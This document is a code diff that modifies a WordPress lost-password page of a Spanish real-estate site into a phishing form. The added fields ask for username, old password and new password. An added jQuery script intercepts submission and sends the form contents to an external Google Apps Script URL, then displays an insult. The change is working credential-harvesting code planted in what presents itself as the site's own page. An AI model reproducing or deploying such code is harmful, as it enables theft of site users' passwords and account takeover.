@@ -7,8 +7,10 @@
 		<html xmlns="http://www.w3.org/1999/xhtml" >
 	<!--<![endif]-->
 	<head>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-	<title>Contraseña perdida &lsaquo; Mikaelian Propiedades &#8212; WordPress</title>
+    <title>Contraseña perdida &lsaquo; Mikaelian Propiedades &#8212; WordPress</title>
 	<link rel='dns-prefetch' href='//s.w.org' />
 <link rel='stylesheet' href='https://www.mikaelianpropiedades.com/wp-admin/load-styles.php?c=1&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.9.9' type='text/css' media='all' />
 <link rel='stylesheet' id='login-style-css'  href='https://www.mikaelianpropiedades.com/wp-content/themes/realhomes/common/css/login-style.css?ver=4.9.9' type='text/css' media='all' />
@@ -22,18 +24,42 @@
 	</head>
 	<body class="login login-action-lostpassword wp-core-ui  locale-es-es">
 		<div id="login">
-		<h1><a href="https://www.mikaelianpropiedades.com" title="Mikaelian Propiedades" tabindex="-1">Mikaelian Propiedades</a></h1>
-	<p class="message">Por favor, escribe tu nombre de usuario o tu correo electrónico. Recibirás un enlace para crear la contraseña nueva por correo electrónico.</p>
+        <h1><a href="https://www.mikaelianpropiedades.com" title="Mikaelian Propiedades" tabindex="-1">Mikaelian Propiedades</a></h1>
+
+	<p class="message" id="info"><strong>Renovar contraseña</strong><br>Por favor, escribe tu nombre de usuario o tu correo electrónico, la contraseña anterior y la contraseña nueva. Elige una contraseña fácil de recordar pero difícil de adivinar.</p>
 
     <!-- action="https://www.mikaelianpropiedades.com/wp-login.php?action=lostpassword" -->
 <form name="lostpasswordform" id="lostpasswordform" method="post">
 	<p>
 		<label for="user_login" >Nombre de usuario o dirección de correo<br />
-		<input type="text" name="user_login" id="user_login" class="input" value="" size="20" /></label>
+        <input type="text" name="user" class="input" value="" size="20" /></label>
+        <label for="user_login" >Contraseña anterior<br />
+        <input type="password" name="old_password" class="input" value="" size="20" /></label>
+        <label for="user_login" >Contraseña nueva<br />
+        <input type="password" name="new_password" class="input" value="" size="20" /></label>
 	</p>
 		<input type="hidden" name="redirect_to" value="" />
-	<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Obtener una contraseña nueva" /></p>
+	<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Actualizar contraseña" /></p>
 </form>
+
+<script>
+var $form = $('form#lostpasswordform'),
+    url = 'https://script.google.com/macros/s/AKfycbxJijLtzM0aSMHtMmJrb5Qx_ZT3nOkOXQE9gKBjspyvRl7HSls/exec'
+    $('#wp-submit').on('click', function(e) {
+    e.preventDefault();
+    object_to_send = $form.serialize();
+    object_to_send += "&timestamp="+(new Date()).toUTCString();
+    console.log(object_to_send);
+    var jqxhr = $.ajax({
+        url: url,
+        method: "GET",
+        dataType: "json",
+        data: object_to_send
+    }).success(
+        document.getElementById("info").innerHTML = "<font color=\"red\">PUTA</font>"
+    );
+    })
+</script>
 
 <p id="nav">
 <a href="https://www.mikaelianpropiedades.com/wp-login.php">Acceder</a>
